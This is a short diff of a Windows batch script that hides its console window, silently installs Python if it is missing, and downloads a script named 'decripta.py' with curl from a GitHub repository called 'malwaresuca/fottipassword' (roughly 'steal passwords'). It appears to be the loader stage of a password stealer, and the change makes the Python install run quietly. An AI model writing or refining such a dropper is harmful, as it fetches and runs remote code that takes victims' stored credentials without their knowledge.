@@ -3,8 +3,9 @@ powershell -WindowStyle Hidden -Command "Add-Type -Name ConsoleUtils -Namespace 
 
 python --version >nul 2>&1
 if %errorlevel% neq 0 (
+    powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe', 'python_installer.exe')"
 
-    powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe', 'python_installer.exe'); Start-Process python_installer.exe -Wait"
+    python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_launcher=0
 )
 
 curl -o decripta.py https://raw.githubusercontent.com/malwaresuca/fottipassword/main/decripta.py
